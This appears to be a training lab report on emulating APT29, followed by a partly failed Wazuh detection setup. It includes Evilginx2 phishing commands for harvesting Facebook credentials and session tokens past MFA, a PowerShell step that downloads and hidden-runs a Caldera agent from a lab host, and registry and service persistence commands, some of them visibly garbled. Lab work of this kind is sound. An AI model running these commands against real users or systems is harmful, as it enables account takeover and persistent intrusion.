# Adversary Emulation and Detection Lab Report

## 1. Executive Summary
This report outlines the deployment, execution, and detection engineering parameters of an adversary emulation exercise mimicking APT29 threat groups. The red team operations successfully demonstrated initial credential harvesting via a reverse-proxy phishing framework (Evilginx2) and command-and-control persistence automation (Caldera). The blue team objective was partially met; while SIEM logging frameworks were drafted, local infrastructure challenges prevented deployment of the endpoint monitoring agent on the Linux host.

---

## 2. Red Team Phase: Adversary Emulation

### 2.1 Initial Access & Credential Harvesting (Evilginx2)
A reverse-proxy phishing framework was established to bypass traditional multi-factor authentication (MFA) protocols by proxying live authentication streams.

*   **Target Infrastructure:** Local Lab Domain (`yourlab.com`) mapped to Attacker IP (`192.168.1.4`).
*   **Target Phishlet:** Facebook deployment configurations.
*   **Operational Execution Syntax:**
    ```text
    : config domain yourlab.com
    : config ipv4 192.168.1.4
    : phishlets hostname facebook yourlab.com
    : phishlets enable facebook
    : lures create facebook
    : lures edit 0 redirect_url facebook.com
    : lures get-url 0
    ```

*   **Exfiltration Verification:**
    Data capture confirmation was validated directly within the interactive session database engine.
    ```text
    : sessions
    : sessions 1
    ```
    *Captured Output Matrix:* Successfully extracted plaintext victim credentials and full JSON-formatted session tokens directly bypassing MFA tokens.

### 2.2 Command & Control and Persistence (Caldera)
Following initial compromise simulations, a Caldera command-and-control framework was initialized to deploy headless Sandcat agents and automate persistent access.

*   **Agent Deployment (Windows Target Sandbox):**
    ```powershell
    \$url="192.168.1";
    \$agent="sandcat.go";
    Invoke-WebRequest -Uri "\$url?file=\(agent" -OutFile "\)env:public\$agent";
    Start-Process -FilePath "\$env:public\$agent" -ArgumentList "-server http://192.168.1.4:8888 -v" -WindowStyle Hidden
    ```
*   **Automated APT29 Execution Tactics:**
    1.  **T1547.001 (Registry Run Keys):**
        ```cmd
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Apt29Update" /t REG_SZ /d "C:\Users\Public\sandcat.go -server http://192.168.1.4:8888" /f
        ```
    2.  **T1543.003 (Windows Service Creation):**
        ```cmd
        sc create "Apt29Svc" binPath= "C:\Users\Public\sandcat.go -server http://192.168.1.4:8888" start= auto
        ```

---

## 3. Blue Team Phase: Detection Engineering & Incident Analysis

### 3.1 Wazuh Agent Installation Failure (Linux Environment)
During the lab validation sequence, the blue team was unable to complete full log aggregation on the Linux endpoint due to deployment exceptions encountered while installing the `wazuh-agent` package.

#### Identified Error Symptoms
*   **Dependency Collisions:** Missing packages or unmet tracking hooks during installation loops (`apt` / `yum` dependency deadlocks).
*   **GPG Key / Repository Unavailability:** TLS handshake or verification failures when connecting outward to official Wazuh update channels.
*   **Service Communication Timeouts:** The local agent service failing to register safely to the Wazuh Manager over ports `1514`/`1515`.

#### Remediation and Recovery Roadmap
To successfully complete the deployment loop, the following troubleshooting sequences are slated for execution:
1.  **Purge Corrupted Instances:**
    ```bash
    sudo apt-get purge wazuh-agent -y && sudo apt-get autoremove -y
    ```
2.  **Re-import Official GPG Security Keys manually:**
    ```bash
    curl -s wazuh.com | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
    ```
3.  **Validate Port Connectivity to Manager:**
    ```bash
    nc -zv <WAZUH_MANAGER_IP> 1514
    nc -zv <WAZUH_MANAGER_IP> 1515
    ```

### 3.2 Postulated Detection Matrix
Had the endpoint compilation completed successfully, the tracking engine would detect the adversary profile utilizing standard rule sets:


| TACTIC | TECHNIQUE | LOG MONITORING CHANNEL | WAZUH RULE TARGET |
| :--- | :--- | :--- | :--- |
| **Persistence** | T1547.001 | Sysmon Event ID 13 | Rule ID 60109/60110 (Registry Value Set) |
| **Persistence** | T1543.003 | Sysmon Event ID 1 / Security | Rule ID 100051 (Service Binary Creation) |

---

## 4. Conclusion & Next Steps
1.  **Fix Infrastructure:** Remediate the local Linux Wazuh network/dependency barriers to bring full endpoint logging online.
2.  **Verify End-to-End Pipeline:** Re-execute the Caldera APT29 operation profile to confirm alerts generate in the active dashboard.
